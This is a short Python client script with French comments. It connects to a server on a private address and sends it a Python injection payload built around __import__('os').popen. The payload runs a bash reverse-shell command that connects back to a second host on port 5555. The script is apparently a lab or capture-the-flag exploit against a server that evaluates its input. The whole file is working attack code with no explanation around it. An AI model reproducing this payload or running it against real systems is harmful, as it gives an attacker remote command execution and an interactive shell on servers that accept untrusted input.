import socket
import sys
import re
import logging
# On définit la destination de la connexion
host = '10.33.66.78'  # IP du serveur
port = 13339        # Port choisir par le serveur

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send("Ok".encode())
    data = s.recv(1024)
    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.33.49.124/5555 0>&1').read()"
    s.send(userMessage.encode("utf-8"))
    data = s.recv(1024)
    s.close()
    print(repr(data.decode()))
    sys.exit(0)
   # Assurez-vous que le socket est fermé même en cas d'erreur
except socket.error as e :
    s.close()
    sys.exit(1)
# Close the connection.